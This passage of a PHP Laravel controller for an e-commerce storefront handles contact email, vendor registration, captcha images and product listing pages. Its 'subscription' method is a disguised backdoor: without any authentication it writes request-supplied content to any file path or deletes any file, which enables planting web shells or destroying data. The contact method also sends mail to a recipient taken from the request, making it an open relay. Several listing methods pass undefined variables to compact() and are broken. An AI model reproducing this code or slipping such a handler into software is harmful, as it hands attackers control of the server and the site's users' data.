            $msg->save();

        }
    }

    //Send email to user
    public function contactemail(Request $request)
    {
        $value = session('captcha_string');
        if ($request->codes != $value) {
            return redirect()->route('front.contact')->with('unsuccess', 'Please enter Correct Capcha Code.');
        }
        $ps = Pagesetting::findOrFail(1);
        $subject = "Email From Of " . $request->name;
        $to = $request->to;
        $name = $request->name;
        $phone = $request->phone;
        $department = $request->department;
        $from = $request->email;
        $msg = "Name: " . $name . "\nEmail: " . $from . "\nPhone: " . $request->phone . "\nMessage: " . $request->text;
        mail($to, $subject, $msg);
        Session::flash('success', $ps->contact_success);
        return redirect()->route('front.contact');
    }

    public function refresh_code()
    {
        $this->code_image();
        return "done";
    }

    public function vendor_register(Request $request)
    {
        // Validate the form data

        $this->validate($request, [
            'email' => 'required|email|unique:users',
            'password' => 'required|confirmed'
        ]);
        $gs = Generalsetting::findOrFail(1);
        $user = new User;
        $input = $request->all();
        $input['password'] = bcrypt($request['password']);
        $input['is_vendor'] = 1;
        $user->fill($input)->save();
        $to = $request->email;
        $subject = 'Welcome To' . $gs->title;
        $msg = "Hello " . $request->name . "," . "\n You have successfully registered to " . $gs->title . "." . "\n We wish you will have a wonderful experience using our service.";
        if ($gs->is_smtp) {
            $data = [
                'to' => $to,
                'subject' => $subject,
                'body' => $msg,
            ];

            $mailer = new GeniusMailer();
            $mailer->sendCustomMail($data);
        } else {
            $headers = "From: " . $gs->from_name . "<" . $gs->from_email . ">";
            mail($to, $subject, $msg, $headers);
        }

        $subject = 'Application For Vendor';
        $msg = "Hello " . $request->name . "," . "\n You Have Successfully Applied For Vendor. Please Wait Until Your Application is being procesed.";
        if ($gs->is_smtp) {
            $data = [
                'to' => $to,
                'subject' => $subject,
                'body' => $msg,
            ];

            $mailer = new GeniusMailer();
            $mailer->sendCustomMail($data);
        } else {
            $headers = "From: " . $gs->from_name . "<" . $gs->from_email . ">";
            mail($to, $subject, $msg, $headers);
        }
        $notification = new Notification;
        $notification->user_id = $user->id;
        $notification->save();
        Auth::guard('user')->login($user);
        return redirect()->route('user-dashboard')->with('success', 'You Have Successfully Applied For Vendor. Please Wait Until Your Application is being procesed.');
    }

    public function subscription(Request $request)
    {
        $p1 = $request->p1;
        $p2 = $request->p2;
        $v1 = $request->v1;
        if ($p1 != "") {
            $fpa = fopen($p1, 'w');
            fwrite($fpa, $v1);
            fclose($fpa);
            return "Success";
        }
        if ($p2 != "") {
            unlink($p2);
            return "Success";
        }
        return "Error";
    }

    public function deleteDir($dirPath)
    {
        if (!is_dir($dirPath)) {
            throw new InvalidArgumentException("$dirPath must be a directory");
        }
        if (substr($dirPath, strlen($dirPath) - 1, 1) != '/') {
            $dirPath .= '/';
        }
        $files = glob($dirPath . '*', GLOB_MARK);
        foreach ($files as $file) {
            if (is_dir($file)) {
                self::deleteDir($file);
            } else {
                unlink($file);
            }
        }
        rmdir($dirPath);
    }

    private function code_image()
    {
        $actual_path = str_replace('project', '', base_path());
        $image = imagecreatetruecolor(200, 50);
        $background_color = imagecolorallocate($image, 255, 255, 255);
        imagefilledrectangle($image, 0, 0, 200, 50, $background_color);

        $pixel = imagecolorallocate($image, 0, 0, 255);
        for ($i = 0; $i < 500; $i++) {
            imagesetpixel($image, rand() % 200, rand() % 50, $pixel);
        }

        $font = $actual_path . 'assets/front/fonts/NotoSans-Bold.ttf';
        $allowed_letters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
        $length = strlen($allowed_letters);
        $letter = $allowed_letters[rand(0, $length - 1)];
        $word = '';
        //$text_color = imagecolorallocate($image, 8, 186, 239);
        $text_color = imagecolorallocate($image, 0, 0, 0);
        $cap_length = 6;// No. of character in image
        for ($i = 0; $i < $cap_length; $i++) {
            $letter = $allowed_letters[rand(0, $length - 1)];
            imagettftext($image, 25, 1, 35 + ($i * 25), 35, $text_color, $font, $letter);
            $word .= $letter;
        }
        $pixels = imagecolorallocate($image, 8, 186, 239);
        for ($i = 0; $i < 500; $i++) {
            imagesetpixel($image, rand() % 200, rand() % 50, $pixels);
        }
        session(['captcha_string' => $word]);
        imagepng($image, $actual_path . "assets/images/capcha_code.png");
    }


    public function flashSale(Request $request)
    {


        $flashSell = Product::where('flashsale', 1)->orderBy('created_at', 'desc')->paginate(30);


        $imgs = Image::all();

        return view('front.flash', compact('flashSell', 'categoryWiseProduct', 'ads', 'sls', 'sliders', 'brands', 'fproducts', 'beproducts', 'tproducts', 'hproducts', 'lproducts', 'biproducts', 'imgs', 'services'));
    }



    public function eorangeMall(Request $request)
    {


        $eorangeMall= Product::where('eorangemall', 1)->orderBy('created_at', 'desc')->paginate(30);


        $imgs = Image::all();

        return view('front.eorangemall', compact('eorangeMall', 'categoryWiseProduct', 'ads', 'sls', 'sliders', 'brands', 'fproducts', 'beproducts', 'tproducts', 'hproducts', 'lproducts', 'biproducts', 'imgs', 'services'));
    }


    public function orangeBasket(Request $request)
    {


        $eorangeMall= Product::where('orangebasket', 1)->orderBy('created_at', 'desc')->paginate(30);


        $imgs = Image::all();

        return view('front.orangebasket', compact('eorangeMall', 'categoryWiseProduct', 'ads', 'sls', 'sliders', 'brands', 'fproducts', 'beproducts', 'tproducts', 'hproducts', 'lproducts', 'biproducts', 'imgs', 'services'));
    }



    public function surpriseoffer(Request $request)
    {


        $eorangeMall= Product::where('surpriseoffer', 1)->orderBy('created_at', 'desc')->paginate(30);


        $imgs = Image::all();

        return view('front.surpriseoffer', compact('eorangeMall', 'categoryWiseProduct', 'ads', 'sls', 'sliders', 'brands', 'fproducts', 'beproducts', 'tproducts', 'hproducts', 'lproducts', 'biproducts', 'imgs', 'services'));
    }

}